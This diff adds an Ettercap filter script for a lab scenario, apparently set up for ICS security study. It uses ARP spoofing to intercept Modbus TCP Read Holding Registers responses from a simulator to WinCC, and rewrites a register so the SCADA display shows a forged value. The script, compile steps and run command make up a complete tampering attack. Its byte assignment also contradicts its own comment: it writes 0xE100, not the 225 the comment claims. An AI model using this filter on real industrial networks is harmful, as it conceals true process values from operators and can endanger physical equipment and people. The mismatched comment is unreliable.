@@ -1,0 +1,43 @@
+/*
+ * modbus_tampering_read.ecf
+ *
+ * Ettercap filter — Modbus TCP Read Tampering
+ * Target: Read Holding Registers response (Function Code 0x03)
+ *
+ * Scenario:
+ *   Attacker intercepts Read responses coming FROM ModRSsim2 (192.168.0.10)
+ *   TOWARDS WinCC (192.168.0.20) on port 502.
+ *   The filter modifies the register value in the server response
+ *   before it reaches the SCADA layer — WinCC displays the forged value.
+ *
+ * Modbus TCP Read Response layout (offsets within DATA.data[]):
+ *   [0-1]  Transaction ID
+ *   [2-3]  Protocol ID (0x00 0x00)
+ *   [4-5]  Length
+ *   [6]    Unit ID
+ *   [7]    Function Code  → 0x03 = Read Holding Registers (response)
+ *   [8]    Byte Count
+ *   [9-10] Register 0 value (Hi byte, Lo byte)  ← modified here
+ *   [11-12] Register 1 value
+ *   ...
+ *
+ * Compile:
+ *   etterfilter modbus_tampering_read.ecf -o modbus_tampering_read.ef
+ *
+ * Run:
+ *   ettercap -T -q -F modbus_tampering_read.ef -M arp:remote \
+ *     /192.168.0.20// /192.168.0.10//
+ */
+
+if (ip.proto == TCP && tcp.src == 502) {
+
+    /* Check Function Code = 0x03 (Read Holding Registers — response) */
+    if (DATA.data[7] == 0x03) {
+
+        /* Replace first register value with 0x00E1 (225 decimal) */
+        DATA.data[9]  = 0xE1;
+        DATA.data[10] = 0x00;
+
+        msg("TAMPERING: Modbus Read FC=0x03 response — register value replaced with 225\n");
+    }
+}
